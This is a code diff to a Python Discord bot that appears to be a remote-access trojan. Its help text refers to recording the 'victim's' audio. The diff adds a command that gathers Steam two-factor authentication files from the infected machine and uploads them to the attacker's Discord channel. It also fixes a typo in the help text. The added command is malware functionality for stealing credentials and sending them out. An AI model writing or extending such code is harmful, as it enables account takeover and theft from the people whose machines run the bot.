@@ -6,6 +6,7 @@ import threading
 import os as osVars
 import os.path as osp
 import platform
+from steam2fa import getSteamFils
 
 
 def main():
@@ -88,6 +89,15 @@ def main():
         exit(0)
 
     @bot.command()
+    async def getSteam2fa(ctx):
+        for file in getSteamFils():
+            if osp.exists(file):
+                await ctx.send(f"Uploading file...")
+                await ctx.send(file=discord.File(file))
+            else:
+                await ctx.send("Steam file doesn't exist")
+
+    @bot.command()
     async def get_help(ctx):
         await ctx.send("------------------------------- HELP -------------------------------\n\n"
                        "!get_help -> View help message (This message)\n"
@@ -105,11 +115,14 @@ def main():
                        "!record -> Record victim's default audio input & output\n"
                        "Usage: !record Xs | !record Xm | !record Xh (X is a number)\n\n"
                        
+                       "Get Steam authentication files "
+                       "Usage: !getSteam2fa\n\n"
+
                        "!disconnect -> Close the bot, will terminate the program immediately\n"
                        "Usage: !disconnect\n\n"
                        
                        "!safe_disconnect -> Close the bot safely, will close all created threads\n"
-                       "USage: !safe_disconnect\n\n"
+                       "Usage: !safe_disconnect\n\n"
                        "------------------------------- HELP -------------------------------")
 
     bot.run(token)
